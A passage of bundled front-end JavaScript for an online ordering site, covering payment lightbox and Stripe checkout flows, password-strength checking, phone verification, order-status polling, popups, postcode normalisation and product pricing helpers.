fkECQoAAAAsAAAAABwAHAAAB/+AAIKDhIWGh4iGD4mMh1UCjYkNXlWDSQKVgo+Rgkl3HZkCSEmdMwqcgnNOWoI8SDwAD0VFSKgAP05ONgACPLApKUUujAsesABIek46CkmuAjNFp4IPPIuEQ3p2dDgAJBEmhdAuLikDGljDhTY6OjtZM4guAlRYWFSZhmB9cF3Xhxg0aBjw75ABNVYaGcDACEkDA+EaVUmSJJ8gF2AmgDgRBkWkGQwWlJBA5ViSG3PqOHiTIFIDDwtESkhBqAqRKTgoROJRJAUmRlA8MHoggSEjA16yQKiFiEqMGFgSXaETQcsEKoiSYIlRI0YJdYRMuIkgxYcLCSs0gEVyxcq8K1NhhpQwxCDEgEE3WrQggsPHFCpQcGCNlYKIRUNXyrTA4aIHAigArOAYUrDRhgk0yF1YQQBAChwhGqB6IEbJNCMIpggaAOYKKgwXjAJggSAiAANHbBW6kgMsAN+6q7jWTfxQIAA7AAAAAAAAAAAA')
        spinner.setAttribute('id', 'rxp-loader-' + randomId)
        spinner.style.left = '50%'
        spinner.style.position = 'fixed'
        spinner.style.background = '#FFFFFF'
        spinner.style.borderRadius = '50%'
        spinner.style.width = '30px'
        spinner.style.marginLeft = '-15px'
        spinner.style.zIndex = '200'
        spinner.style.marginLeft = '-15px'
        spinner.style.top = '120px'

        document.body.appendChild(spinner)

        //Create the iframe
        iFrame = document.createElement('iframe')
        iFrame.setAttribute('name', 'rxp-frame-' + randomId)
        iFrame.setAttribute('id', 'rxp-frame-' + randomId)
        iFrame.setAttribute('height', '85%')
        iFrame.setAttribute('frameBorder', '0')
        iFrame.setAttribute('width', '360px')
        iFrame.setAttribute('seamless', 'seamless')

        iFrame.style.zIndex = '10001'
        iFrame.style.position = 'absolute'
        iFrame.style.transition = 'transform 0.5s ease-in-out'
        iFrame.style.transform = 'scale(0.7)'
        iFrame.style.opacity = '0'

        overlayElement.appendChild(iFrame)

        if (isMobileIFrame) {
          iFrame.style.top = '0px'
          iFrame.style.bottom = '0px'
          iFrame.style.left = '0px'
          iFrame.style.marginLeft = '0px;'
          iFrame.style.width = '100%'
          iFrame.style.height = '100%'
          iFrame.style.minHeight = '100%'
          iFrame.style.WebkitTransform = 'translate3d(0,0,0)'
          iFrame.style.transform = 'translate3d(0, 0, 0)'
          var metaTag = document.createElement('meta')
          metaTag.name = 'viewport'
          metaTag.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0'
          document.getElementsByTagName('head')[0].appendChild(metaTag)
        } else {
          iFrame.style.top = '40px'
          iFrame.style.left = '50%'
          iFrame.style.marginLeft = '-180px'
        }

        iFrame.onload = function () {
          iFrame.style.opacity = '1'
          iFrame.style.transform = 'scale(1)'

          if (spinner.parentNode) {
            spinner.parentNode.removeChild(spinner)
          }
          createCloseButton()
        }

        var form = createForm(document)
        if (iFrame.contentWindow.document.body) {
          iFrame.contentWindow.document.body.appendChild(form)
        } else {
          iFrame.contentWindow.document.appendChild(form)
        }

        form.submit()
      }

      function openWindow () {

        //open new window
        tabWindow = window.open()
        var doc = tabWindow.document

        //add meta tag to new window (needed for iOS 8 bug)
        var meta = doc.createElement('meta')
        var name = doc.createAttribute('name')
        name.value = 'viewport'
        meta.setAttributeNode(name)
        var content = doc.createAttribute('content')
        content.value = 'width=device-width'
        meta.setAttributeNode(content)
        doc.head.appendChild(meta)

        //create form, append to new window and submit
        var form = createForm(doc)
        doc.body.appendChild(form)
        form.submit()
      }

      function closeModal () {

        if (closeButton.parentNode) {
          closeButton.parentNode.removeChild(closeButton)
        }

        if (iFrame.parentNode) {
          iFrame.parentNode.removeChild(iFrame)
        }

        if (spinner.parentNode) {
          spinner.parentNode.removeChild(spinner)
        }

        overlayElement.className = ''
        setTimeout(function () {
          if (overlayElement.parentNode) {
            overlayElement.parentNode.removeChild(overlayElement)
          }
        }, 300)
      }

      return {
        lightbox: function () {

          if (isMobileNewTab) {
            openWindow()
          } else {
            createOverlay()
            createIFrame()
          }
        },
        close: function () {
          closeModal()
        },
        setToken: function (hppToken) {
          token = hppToken
        }
      }
    }

    return {
      // Get the Singleton instance if one exists
      // or create one if it doesn't
      getInstance: function (hppToken) {

        if (!instance) {
          instance = init()
        }

        //Set the hpp token
        instance.setToken(hppToken)

        return instance
      }
    }

  })()

  var openLightbox = function (merchantUrl, serverSdkJson, _hppUrl) {
    hppUrl = _hppUrl

    // Get the lightbox instance (it's a singleton) and set the sdk json
    var lightboxInstance = RxpLightbox.getInstance(serverSdkJson)
    lightboxInstance.lightbox()

    function receiveMessage (event) {

      // Check the origin of the response comes from HPP
      if (getHostnameFromUrl(event.origin) === getHostnameFromUrl(hppUrl)) {

        // Check for iframe resize values
        if (event.data && JSON.parse(event.data).iframe) {
          if (!isMobileNewTab) {
            var iframeWidth = JSON.parse(event.data).iframe.width
            var iframeHeight = JSON.parse(event.data).iframe.height

            var iFrame = document.getElementById('rxp-frame-' + randomId)
            iFrame.setAttribute('width', iframeWidth)
            iFrame.setAttribute('height', iframeHeight)
            iFrame.style.backgroundColor = '#ffffff'

            if (isMobileIFrame) {
              var overlay = document.getElementById('rxp-overlay-' + randomId)
              iFrame.style.marginLeft = '0px'
              iFrame.style.WebkitOverflowScrolling = 'touch'
              iFrame.style.overflowX = 'scroll'
              iFrame.style.overflowY = 'scroll'
              overlay.style.overflowX = 'scroll'
              overlay.style.overflowY = 'scroll'

            } else {
              iFrame.style.marginLeft = (parseInt(iframeWidth.replace('px', ''), 10) / 2 * -1) + 'px'
            }

            var closeButton = document.getElementById('rxp-frame-close-' + randomId)
            closeButton.style.marginLeft = ((parseInt(iframeWidth.replace('px', ''), 10) / 2) - 7) + 'px'
          }

        } else {

          if (isMobileNewTab) {
            // Close the new window
            if (tabWindow) {
              tabWindow.close()
            }
          } else {
            // Close the lightbox
            lightboxInstance.close()
          }

          var response = event.data

          // Create a form and submit the hpp response to the merchant's response url
          var form = document.createElement('form')
          form.setAttribute('method', 'POST')
          form.setAttribute('action', merchantUrl)

          var hiddenField = document.createElement('input')
          hiddenField.setAttribute('type', 'hidden')
          hiddenField.setAttribute('name', 'hppResponse')
          hiddenField.setAttribute('value', response)

          form.appendChild(hiddenField)

          document.body.appendChild(form)

          form.submit()
        }
      }
    }

    if (window.addEventListener) {
      window.addEventListener('message', receiveMessage, false)
    } else {
      window.attachEvent('message', receiveMessage)
    }

  }

  function getHostnameFromUrl (url) {
    var parser = document.createElement('a')
    parser.href = url
    return parser.hostname
  }

  return {
    openLightbox: openLightbox
  }

}())
/*****************************
 Payment Stripe
 *****************************/

var PaymentStripe = (function () {
  var card,
      payment_method_id,
      stripe,
      use_three_d_secure

  var PASSHTHROUGH_FIELDS = ['payment_method_id', 'redirect_to_page', 'loyalty_points', 'cb_loyalty_points']

  function init (_stripe, _payment_method_id, _use_three_d_secure, locale, style) {
    payment_method_id = _payment_method_id
    stripe = _stripe
    use_three_d_secure = _use_three_d_secure

    var elements = stripe.elements({ locale: locale })

    init_google_pay(_stripe, elements)

    card = elements.create('card', { style: style })
    card.mount('#stripe_card_element')
  
    card.addEventListener('change', function (event) {
      var displayError = document.getElementById('stripe_card_errors')
      if (event.error) {
        displayError.textContent = event.error.message
      } else {
        displayError.textContent = ''
      }
    })
  
    $j('#step4_submit').click(function (event) {
      if (payment_method_id == Payment.selectedMethodId()) {
        event.preventDefault()
  
        if ($j('#payment_option_bancontact').length > 0 && $j('#payment_option_bancontact').is(':checked') && $j('#bancontact_name').val() != '') {
          payWithBancontact()
          return
        }
  
        var saved_card_id = $j('input[name="saved_card_id"]:checked').val()
  
        if (saved_card_id) {
          payWithSavedCard(saved_card_id)
        } else {
          use_three_d_secure ? payWithNewCard3DS() : payWithNewCard()
        }
      }
    })
  
    $j('input[name="saved_card_id"]').click(cardClicked)
    cardClicked()
  }

  function initConnectAccount (_stripe, _payment_method_id, locale, style) {
    payment_method_id = _payment_method_id
    stripe = _stripe

    let google_payment_displayed_infos = document.getElementsByClassName("google_payment_displayed_infos");
    if (google_payment_displayed_infos.length === 0) return;
    let country = google_payment_displayed_infos.country.value
    let currency = google_payment_displayed_infos.currency.value
    let total_amount = google_payment_displayed_infos.total_amount.value

    data = {
      country: country,
      currency: currency,
      total_amount: total_amount
    }

    secret = fetch('/stripe_connect_payments/secret', {
      method: 'POST',
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data)
    }).then(response => {
      return response.json();
    }).then(secret => {
      var elements = stripe.elements({ 
        locale: locale, 
        clientSecret: secret.client_secret, 
        paymentMethodCreation: 'manual',
        disallowedCardBrands : ["american_express"]
      })
  
      const paymentElement = elements.create("payment");
      paymentElement.mount("#stripe_card_element");

      $j('#step4_submit').click(async function (event) {
        if (payment_method_id == Payment.selectedMethodId()) {
          event.preventDefault();
          await elements.submit();

          let payment_method;
          await stripe.createPaymentMethod({
            elements,
            params: {
            },
          }).then(function (result) {
              payment_method = result.paymentMethod;

              stripeHandler3({token: {id: secret.client_secret, payment_method_id: payment_method.id}});
              sendForm(url, 'stripe_confirmation_result', JSON.stringify(value))
          });
        }
      })
    })
  }

  function init_google_pay(_stripe, elements) {
    let google_payment_displayed_infos = document.getElementsByClassName("google_payment_displayed_infos");
    if (google_payment_displayed_infos.length === 0) return;
    let country = google_payment_displayed_infos.country.value
    let currency = google_payment_displayed_infos.currency.value
    let total_amount = google_payment_displayed_infos.total_amount.value
    var paymentRequest = _stripe.paymentRequest({
      country: country,
      currency: currency.toLowerCase(),
      total: {
        amount: Number(total_amount),
        label: "Total"
      },
    });
    console.log(paymentRequest)

    paymentRequest.on("token", function(result) {
      console.log("paymentRequest")
      var example = document.querySelector(".example5");
      console.log(example)
      console.log(result.token.id)
      document.querySelector(".token").innerText = result.token.id;
      example.classList.add("submitted");
      result.complete("success");

      stripeHandler2(result);
    });

    var paymentRequestElement = elements.create("paymentRequestButton", {
      paymentRequest: paymentRequest,
      style: {
        paymentRequestButton: {
          theme: "light"
        }
      }
    });

    paymentRequest.canMakePayment().then(function(result) {
      console.log('canMakePayment')
      if (result) {
        paymentRequestElement.mount("#example5-paymentRequest");
      }
    });
  }

  // With 3D Secure

  function payWithBancontact () {
    var bancontact = {
      billing_details: {
        name: $j('#bancontact_name').val()
      }
    }
    stripe
      .createPaymentMethod('bancontact', bancontact)
      .then(function (result) {
        if (result.error) {
          // Inform the customer that there was an error.
          var errorElement = document.getElementById('stripe_card_errors')
          errorElement.textContent = result.error.message
        } else {
          // Send the token to server
          stripeHandler(result)
        }
      })
  }

  function payWithNewCard3DS () {
    stripe
      .createPaymentMethod('card', card)
      .then(function (result) {
        if (result.error) {
          // Inform the customer that there was an error.
          var errorElement = document.getElementById('stripe_card_errors')
          errorElement.textContent = result.error.message
        } else {
          // Send the token to server
          stripeHandler(result)
        }
      })
  }

  function confirmPayment(stripe, client_secret, url, payment_type, bancontact_url) {
    if (payment_type === 'bancontact') {
      stripe
        .confirmBancontactPayment(client_secret, { return_url: bancontact_url })
        .then(function(result) {
          var value
          if (result.error) {
            value = {
              error: {
                code: result.error.code,
                decline_code: result.error.decline_code
              }
            }
          } else {
            value = result
          }

          sendForm(url, 'stripe_confirmation_result', JSON.stringify(value))
        })
    } else {
      console.log('confirmPayment stripe')

      stripe.confirmCardPayment(client_secret).then(function(result) {
        var value
        if (result.error) {
          value = {
            error: {
              code: result.error.code,
              decline_code: result.error.decline_code
            }
          }
        } else {
          value = result
        }

        sendForm(url, 'stripe_confirmation_result', JSON.stringify(value))
      })
    }
  }

  function confirmStripeConnectPayment(stripe, client_secret, url) {
    stripe.confirmPayment({
      clientSecret: client_secret,
      confirmParams: {
        return_url: url
      }}).then(function(result) {
      var value
      if (result.error) {
        value = {
          error: {
            code: result.error.code,
            decline_code: result.error.decline_code
          }
        }
      } else {
        value = result
      }

      console.log('stripe_confirmation_result')

      sendForm(url, 'stripe_confirmation_result', JSON.stringify(value))
    })
  }

  function sendForm (url, attr_name, attr_value) {
    var ghost_form = $j('<form action="' + url + '" method="POST" id="stripe_ghost_form" style="display:none;"></form>')
    ghost_form.append('<input type="hidden" name="' + attr_name + '" value=' + attr_value + ' />')
    $j('body').append(ghost_form)

    $j('#stripe_ghost_form').submit()
  }

  // Without 3D Secure

  function payWithSavedCard (saved_card_id) {
    var ghost_form = $j('<form action="/stripe_payments/use_saved_card" method="POST" id="stripe_ghost_form" style="display:none;"></form>')

    addPassthroughFields($j('#step4_form'), ghost_form)
    ghost_form.append('<input type="hidden" name="saved_card_id" value="' + saved_card_id + '" />')
    $j('body').append(ghost_form)

    $j('#stripe_ghost_form').submit()
  }

  function payWithNewCard () {
    stripe.createToken(card)
      .then(function (result) {
        if (result.error) {
          // Inform the customer that there was an error.
          var errorElement = document.getElementById('stripe_card_errors')
          errorElement.textContent = result.error.message
        } else {
          // Send the token to your server.
          stripeHandler(result)
        }
      })
  }

  function stripeHandler2(result) {
    var action = 'use_new_card'
    var ghost_form = $j('<form action="/stripe_payments/' + action + '" method="POST" id="stripe_ghost_form" style="display:none;"></form>')
    var token = encodeURIComponent(JSON.stringify(result.token))

    ghost_form.append('<input type="hidden" name="stripe_token" value="' + token + '" />')
    addPassthroughFields($j('#step4_form'), ghost_form)

    var save_card = $j('input[name=stripe_save_card]').is(':checked')
    if (save_card) {
      ghost_form.append('<input type="hidden" name="save_card" value="' + save_card + '" />')
    }
    $j('body').append(ghost_form)

    ghost_form.submit()
  }

  function stripeHandler3(result) {
    var action = 'use_new_card2'
    var ghost_form = $j('<form action="/stripe_connect_payments/' + action + '" method="POST" id="stripe_ghost_form" style="display:none;"></form>')
    var token = encodeURIComponent(JSON.stringify(result.token));

    ghost_form.append('<input type="hidden" name="stripe_token" value="' + token + '" />');
    addPassthroughFields($j('#step4_form'), ghost_form)

    var save_card = $j('input[name=stripe_save_card]').is(':checked')
    if (save_card) {
      ghost_form.append('<input type="hidden" name="save_card" value="' + save_card + '" />')
    }
    $j('body').append(ghost_form)

    ghost_form.submit()
  }

  function stripeHandler (result) {
    var action = 'use_new_card'
    var ghost_form = $j('<form action="/stripe_payments/' + action + '" method="POST" id="stripe_ghost_form" style="display:none;"></form>')
    var token = encodeURIComponent(JSON.stringify(use_three_d_secure ? result.paymentMethod : result.token))

    ghost_form.append('<input type="hidden" name="stripe_token" value="' + token + '" />')
    addPassthroughFields($j('#step4_form'), ghost_form)

    var save_card = $j('input[name=stripe_save_card]').is(':checked')
    if (save_card) {
      ghost_form.append('<input type="hidden" name="save_card" value="' + save_card + '" />')
    }
    $j('body').append(ghost_form)

    ghost_form.submit()
  }

  function addPassthroughFields (source_form, dest_form) {
    $j.each(source_form.serializeArray(), function (i, field) {
      if (PASSHTHROUGH_FIELDS.indexOf(field.name) >= 0) {
        dest_form.append('<input type="hidden" name="passthrough_' + field.name + '" value="' + field.value + '" />')
      }
    })
  }

  function cardClicked () {
    // Hide warnings
    $j('.card-entry input').removeClass('card-entry__warning')
    // Toggle forms
    var saved_card_id = $j('input[name="saved_card_id"]:checked').val()
    $j('.card-entry__new-card').toggle(!saved_card_id)
  }

  return {
    init: init,
    initConnectAccount: initConnectAccount,
    confirmPayment: confirmPayment,
    confirmStripeConnectPayment: confirmStripeConnectPayment
  }
}());
/*****************************
 Password Checker
 *****************************/

(function (window) {

  // ---------------------------------------------
  // Abstract PasswordGraphics Class

  function PasswordGraphics () {

    this.config = {}
    this.variations = {}
    this.super = Object.getPrototypeOf(this)

    function fillBar (value) {
      switch (value) {
        case 'strong':
          $j('[data-password-score]').addClass('strong')
          break
        case 'medium':
          $j('[data-password-score]').addClass('medium')
          break
        default:
          $j('[data-password-score]').addClass('weak')
      }
    }

    this.updateModal = function (value) {
      $j('[data-password-modal]').fadeIn()
      $j('[data-password-label]').html(this.label(value))
      $j('[data-password-text]').html(this.generateMessage())
      fillBar(value)
    }

    this.label = function (value) {
      switch (value) {
        case 'strong':
          return this.config.strong || 'strong'
        case 'medium':
          return this.config.medium || 'medium'
        case 'weak':
          return this.config.weak || 'weak'
        default:
          return value
      }
    }

    this.generateMessage = function () {
      return (this.config.first_line ? this.config.first_line + '<br>' : '') + (this.config.second_line ? this.config.second_line : '')
    }

    this.generateVariations = function (password) {
      return this.variations = {
        digit: /\d/.test(password),
        lower: /[a-z]/.test(password),
        upper: /[A-Z]/.test(password),
        symbol: /\W/.test(password)
      }
    }

    this.super.registerEvents = function () {
      var context = this

      $j('[data-password]').on('keypress keyup keydown', function () {
        context.clearCondition()
        context.updateModal(context.check($j(this).val()))
      })
    }

    this.super.clearCondition = function () {
      $j('[data-password-score]').removeClass('weak medium strong')
    }

  }

  // ---------------------------------------------
  // Password Helper Class

  function PasswordHelper () {

    // inherit from graphics
    PasswordGraphics.call(this)

    var self = this

    // Calculate a score for the password
    this.check = function (password) {
      this.generateVariations(password)
      var score = 0

      // award every unique letter until 5 repetitions
      var letters = new Object()
      for (var i = 0; i < password.length; i++) {
        letters[password[i]] = (letters[password[i]] || 0) + 1
        score += 5.0 / letters[password[i]]
      }

      // bonus points for mixing it up
      variationCount = 0
      for (var variation in this.variations) {
        variationCount += (this.variations[variation] == true) ? 1 : 0
      }
      score += (variationCount - 1) * 10
      score = parseInt(score)

      if (score > 60)
        return 'strong'
      if (score >= 30)
        return 'medium'
      return 'weak'
    }

    // External API
    return {
      init: function (in_config) {
        self.config = in_config || {}
        $j(function () {
          self.registerEvents()
        })
      }
    }
  }

  // ---------------------------------------------
  // Password Validator Class

  function PasswordValidator () {

    // inherit from graphics
    PasswordGraphics.call(this)

    var self = this
    self.config = {
      need_upper: true,
      need_digit: true,
      min_char: 8,
      weak: 'weak',
      strong: 'strong'
    }

    // Update label if the password submitted is wrong
    function updateLabel () {
      if (!$j('[data-password]').hasClass('error')) {
        $j('[data-password]').addClass('error')
        $j('[data-password]').parent().append('<span class=\'password-checker__input-message\'>' + self.generateMessage() + '</span>')
      }
    }

    // Test if the rules are respected
    this.check = function (password) {
      this.generateVariations(password)
      if (password.length < this.config.min_char) return 'weak'
      if (this.config.need_upper && !this.variations.upper) return 'weak'
      if (this.config.need_digit && !this.variations.digit) return 'weak'
      if (this.config.need_symbol && !this.variations.symbol) return 'weak'
      return 'strong'
    }

    // Overwrite the RegisterEvents method
    this.registerEvents = function () {
      // call mother function
      this.super.registerEvents.call(this)

      // Block the registration
      $password_input = $j('[data-password]')
      $password_input.closest('form').submit(function (event) {
        $j('[data-password-modal]').fadeOut()
        if (self.check($password_input.val()) == 'weak') {
          event.preventDefault()
          updateLabel()
        }
      })
    }

    // Overwrite the clearCondition method
    this.clearCondition = function () {
      //call mother function
      this.super.clearCondition.call(this)

      // remove label attributes
      $j('[data-password]').removeClass('error')
      $j('.password-checker__input-message').remove()
    }

    // External API
    return {
      init: function (in_config) {
        Object.assign(self.config, in_config || {})
        $j(function () {
          self.registerEvents()
        })
      }
    }

  }

  // ---------------------------------------------
  // Initialize instances

  window.PasswordHelper = new PasswordHelper()
  window.PasswordValidator = new PasswordValidator()

})(window)
/*****************************
 PhoneVerification
 *****************************/

var PhoneVerification = (function () {
  var sendSMS = function (phone_number) {
    $j.ajax({
      url: '/phone_verification',
      type: 'post',
      data: phone_number ? { phone_number: phone_number } : {},
      dataType: 'json'

    }).done(function (data) {
      $j('[data-phone-verification-step1]').toggle(!!data.error)
      $j('[data-phone-verification-step2]').toggle(!data.error)

      $j('[data-phone-verification-error-invalid-phone]').toggle(data.error === 'invalid_phone')
      $j('[data-phone-verification-error-too-many-attempts]').toggle(data.error === 'too_many_attempts')
      $j('[data-phone-verification-error-cannot-send]').toggle(data.error === 'cannot_send')
    })
  }

  var checkCode = function (phone_verification_code) {
    $j.ajax({
      url: '/phone_verification',
      type: 'delete',
      data: { phone_verification_code: phone_verification_code },
      dataType: 'json'
    }).done(function (data) {
      if (data.success) {
        $j('[data-phone-verification-success]').show()
        Util.redirect(window.location.href)
      } else {
        $j('[data-phone-verification-error-invalid-code]').show()
      }
    })
  }

  return {
    sendSMS: sendSMS,
    checkCode: checkCode
  }
}())
/*****************************
 Poll Order Status
 *****************************/

var PollOrderStatus = (function () {
  var orderId,
      failedUrl

  function init (_orderId, _failedUrl) {
    orderId = _orderId
    failedUrl = _failedUrl

    poll(checkStatus, timeOut, 3 * 1000, 30 * 1000)
  }

  function timeOut () {
    Util.redirect(failedUrl)
  }

  function checkStatus () {
    $j.ajax({
      url: '/order_status',
      type: 'get',
      data: { order_id: orderId }

    }).done(function (data) {
      if (!data.match(/new_order/)) {
        location.reload()
      }
    })
  }

  function poll (fn, timeoutFn, interval, timeout) {
    var startTime = (new Date()).getTime();

    (function p () {
      fn()
      if (((new Date).getTime() - startTime) <= timeout) {
        setTimeout(p, interval)
      } else {
        timeoutFn()
      }
    })()
  }

  return {
    init: init
  }
})()
/*****************************
 Poll Order Status
 *****************************/

var PollPaymentStatus = (function () {
  let orderId, payment_token, payment_gateway, interval

  function init (_orderId, _payment_gateway, _interval) {
    orderId = _orderId
    const urlParams = new URLSearchParams(window.location.search);
    payment_token = urlParams.get('payment_token');
    payment_gateway = _payment_gateway
    interval = Number(_interval)
    console.log(Number(_interval))
    console.log(interval)
    interval = 3000

    pollPaymentStatus()
  }

  function checkStatus () {
    $j.ajax({
      url: 'payment_status',
      type: 'get',
      data: { order_id: orderId, payment_token: payment_token },

    }).done(function (data) {
      if (data['redirect_to'] !== undefined && data['redirect_to'] !== null && !window.location.href.includes(data['redirect_to'])) {
        window.location.href = data['redirect_to']
      }
    })
  }

  function pollPaymentStatus () {
    (function p () {
      checkStatus()
      setTimeout(p, interval)
    })()
  }

  return {
    init: init
  }
})()
/*****************************
 Popup
 *****************************/

var Popup = (function () {
  var showMobileBasket

  function open () {
    showMobileBasket = $j('#sidebar-ofc').hasClass('off-canvas_open')
    if (showMobileBasket) $j.sidr('close', 'sidebar-ofc')

    isImproved() ? improvedOpen() : classicOpen()
  }

  function close () {
    Basket.hideBusy()
    if (showMobileBasket) $j('#basket-off-canvas').click()

    isImproved() ? improvedClose() : classicClose()
  }

  // --------------------
  // Misc
  // --------------------
  function popup () {
    return $j('.popup')
  }

  function isImproved () {
    return popup().hasClass('popup_improved')
  }

  // --------------------
  // Classic popup
  // --------------------
  function classicOpen () {
    var windowH = $j(window).height(),
        popupH = $j('#popup').height(),
        top = (popupH < windowH) ? $j(document).scrollTop() + (windowH - popupH) / 4 + 'px' : $j(document).scrollTop() + windowH * 0.01 + 'px'

    $j('#page-overlay').on('click', close).show()
    popup().css('top', top).show()
  }

  function classicClose () {
    popup().hide()
    $j('#page-overlay').hide().off('click')
  }

  // --------------------
  // Improved popup
  // --------------------
  function improvedOpen () {
    improvedToggle(true)

    $j('#popup-holder-overlay').on('click', close)

    setFullHeight()

    //var isFullHeight = popup().height() > parseInt($j(window).height() * .96)
    //popup().toggleClass('popup_full-height', isFullHeight)

    PopupFloatingTitle.init()

    // popup height fix when image is loaded: full height is not set due to long image uploading

    if (popup().hasClass('popup_full-height')) return // no need to fix

    var dsk = $j(".popup__picture_desktop")
    var mbl = $j(".popup__picture_mobile")

    if (dsk.is(":visible")) {
      dsk.find("img").on('load',setFullHeight)
    } else if (mbl.is(":visible")) {
      mbl.find("img").on('load',setFullHeight)
    }

  }

  function setFullHeight () {
    //var isFullHeight = popup().height() > parseInt($j(window).height() * .96)
    var isFullHeight = popup().outerHeight() > parseInt($j(window).height() * .96)
    popup().toggleClass('popup_full-height', isFullHeight)
  }

  
  function improvedClose () {
    improvedToggle(false)

    $j('#popup-holder-overlay').off('click')
  }

  var improvedToggle = function (visible) {
    $j('.page_improved').toggleClass('page_improved-popup-visible', visible)
    $j('.popup-holder-improved').toggleClass('popup-holder-improved_visible', visible)
    $j('.popup_improved').toggleClass('popup_improved-visible', visible)
  }

  return {
    open: open,
    close: close
  }
}())
/*********************************
 Popup title floating on scroll
 For improved popups only
 ********************************/

var PopupFloatingTitle = (function () {
  var floating_on

  function float_on () {
    $j('.popup_improved').addClass('popup_scrolled')
    $j('.popup_improved').css('top-padding', $j('.popup__title').height())
    floating_on = true
  }

  function float_off () {
    $j('.popup_improved').removeClass('popup_scrolled')
    $j('.popup_improved').css('top-padding', '')
    floating_on = false
  }

  function floating () {
    if ($j('.popup__wrapper').scrollTop() > 0) {
      if (!floating_on) float_on()
    } else {
      if (floating_on) float_off()
    }
  }

  function init () {
    floating_on = false
    $j('.popup__wrapper').on('scroll', floating)
  }

  return {
    init: init
  }
})()
/***************************
 Postcode
 ***************************/

var Postcode = (function () {
  var normalize = function (country, postcode) {
    var stripped_postcode = postcode.replace(/^\s+|\s+$/, '')
    switch (country) {
      case 'GB':
        return normalize_gb(stripped_postcode)
      case 'NL':
        return normalize_nl(stripped_postcode)
      case 'FR':
        return normalize_fr(stripped_postcode)
      default:
        return stripped_postcode
    }
  }

  var sector = function (country, postcode) {
    switch (country) {
      case 'GB':
        var postcode_or_sector = normalize_gb(postcode)
        if (postcode_or_sector) {
          return postcode_or_sector.slice(-2, -1) == ' ' ?
              // This is a sector already
              postcode_or_sector :
              // This is a postcode
              postcode_or_sector.slice(0, -2)
        }
      default:
        return normalize(country, postcode)
    }
  }

  // GB: postcodes can be entered as full postcodes (SW11AA) or sectors (SW1 1)
  // Postcodes entered as sectors need a splitting space, but not full postcodes
  var normalize_gb = function (postcode) {
    var part_1,
        part_2,
        r

    if (r = postcode.match(/^(\w+)\s*(\w{3})\s*/)) {
      part_1 = r[1]
      part_2 = r[2]
    }
    else if (r = postcode.match(/^(\w+)\s+(\w)/)) {
      part_1 = r[1]
      part_2 = r[2]
    }

    if (part_1 && part_2) {
      return (part_1 + ' ' + part_2).toUpperCase()
    }
  }

  // NL: keep only the leading digits
  var normalize_nl = function (postcode) {
    var r
    if (r = postcode.match(/^(\d*)/)) {
      return r[1]
    }
  }

  // FR: keep only the leading digits
  var normalize_fr = function (postcode) {
    var r
    if (r = postcode.match(/^(\d*)/)) {
      return r[1]
    }
  }

  return {
    normalize: normalize,
    sector: sector
  }
})()
/***************************
 Product
 ***************************/

var Product = (function () {
  var WARNING_PRICING_NOT_INITIALIZED = 'Product library not initialized. Call Product.setPricing(...) first.'

  // Ex.: EUR
  var currency

  // Ex.: fr-FR
  var locale

  // null, '1_by_1' or 'charge_difference'
  var swap_toppings

  // 'average', 'most_expensive' or 'most_expensive_incl_toppings'
  var multiside_side_pricing

  // '0.50'
  var multiside_side_pricing_surcharge

  // 'split', 'once' or 'full'
  var multiside_topping_pricing

  // product handle -> 'sku_handles' -> sku key -> sku handle
  //                -> 'skus' -> sku handle -> price
  //                -> 'nb_free_toppings'
  var basePricing = {}

  // product handle -> sku handle -> 'options' -> HMTL id -> price
  //                              -> 'toppings' -> HMTL id -> price
  //                              -> 'side_toppings' -> HMTL id -> price
  //                              -> 'ingredients' -> HMTL id -> price
  //                              -> 'enums' -> HTML id -> price
  //                              -> 'sides' -> HTML id -> price
  var optionPricing = {}

  // product handle -> 'sku_handles' -> sku key -> sku handle
  //                -> 'skus' -> sku handle -> calories
  var calories = {}

  // product handle -> sku handle -> 'options' -> HMTL id -> calories
  //                              -> 'toppings' -> HMTL id -> calories
  //                              -> 'side_toppings' -> HMTL id -> calories
  //                              -> 'ingredients' -> HMTL id -> calories
  //                              -> 'enums' -> HTML id -> calories
  //                              -> 'sides' -> HTML id -> calories
  var optionCalories = {}

  var checkInit = function () {
    if (!currency) console.warn(WARNING_PRICING_NOT_INITIALIZED)
  }

  var moneyToString = function (cents) {
    return cents ?
        Money.toString(cents, currency, locale) :
        ''
  }

  var updateQuantity = function (field, action) {
    var maxlength = parseInt(field.attr('maxlength')),
        limit = Math.pow(10, maxlength) - 1,
        value = Math.max(parseInt(field.val()), 0)
    if (action == '+') {
      value = Math.min(value + 1, limit)
    } else if (action == '-') {
      value = Math.max(value - 1, 1)
    }
    field.val(value)
  }

  var useGlobalSkus = function (form) {
    return $j('[data-grouped-sku-part]').length > 0 && form.find('[data-sku-part]').length == 0
  }

  var useSelect = function (form) {
    if (useGlobalSkus(form)) {
      return form.find('select[data-grouped-sku-part], [data-grouped-sku-part] select').length > 0
    } else {
      return form.find('select[data-sku-part], [data-sku-part] select').length > 0
    }
  }

  var sortedGlobalSkuParts = function () {
    return $j(
        [$j('[data-grouped-sku-part=0]')[0], $j('[data-grouped-sku-part=1]')[0]].filter(function (n) {
          return n !== undefined
        }))
  }

  var sortedSkuParts = function (form) {
    if (useGlobalSkus(form)) {
      return sortedGlobalSkuParts()
    } else {
      return $j(
          [form.find('[data-sku-part=0]')[0], form.find('[data-sku-part=1]')[0]].filter(function (n) {
            return n !== undefined
          }))

    }
  }

  var skuHandle = function (form) {
    // If there is no sku part selector (ie when a multi sku product has only one available sku), return the sku hardcoded in the form
    if (!useGlobalSkus(form) && form.find('[data-sku-part]').length == 0) return form.attr('data-sku')

    var product_handle = form.attr('data-product'),
        use_select = useSelect(form),
        sku_key = sortedSkuParts(form).map(function (i, e) {
          return $j(e).find(use_select ? 'option:selected' : 'input:checked').val()
        }).get().join('$')
    return basePricing[product_handle]['sku_handles'][sku_key]
  }

  var updateSkus = function (form) {
    var product_handle = form.attr('data-product'),
        sorted_sku_parts = sortedSkuParts(form)

    // Hide/show sku parts based on availability
    if (!useGlobalSkus(form) && useSelect(form)) {
      sorted_sku_parts.each(function (sku_part_index, sku_part) {
        var options = $j(sku_part).find('option')

        options.each(function (option_index, option) {
          var sub = sorted_sku_parts.slice(0, sku_part_index).map(function (i, e) {
                return $j(e).find('option:selected').val()
              }).get().concat([option.value]).join('$'),
              is_available = false

          for (var sku in basePricing[product_handle]['sku_handles']) {
            if (sku.indexOf(sub) >= 0) {
              is_available = true
            }
          }
          $j(option).toggle(is_available)
          $j(option).prop('disabled', !is_available)
        })

        var selected_option = options.filter(':selected')
